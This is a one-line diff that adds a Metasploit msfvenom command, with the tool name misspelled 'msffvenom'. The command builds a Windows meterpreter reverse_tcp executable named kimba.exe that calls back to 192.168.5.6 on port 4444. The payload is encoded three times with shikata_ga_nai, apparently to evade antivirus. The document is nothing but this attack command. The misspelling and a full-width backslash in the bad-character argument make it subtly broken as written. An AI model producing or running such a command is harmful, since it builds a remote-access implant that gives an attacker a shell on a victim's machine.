@@ -1,0 +1,1 @@
+msffvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.5.6 LPORT=4444 -e x86/shikata_ga_nai -b `＼x00` -i 3 -f exe > kimba.exe
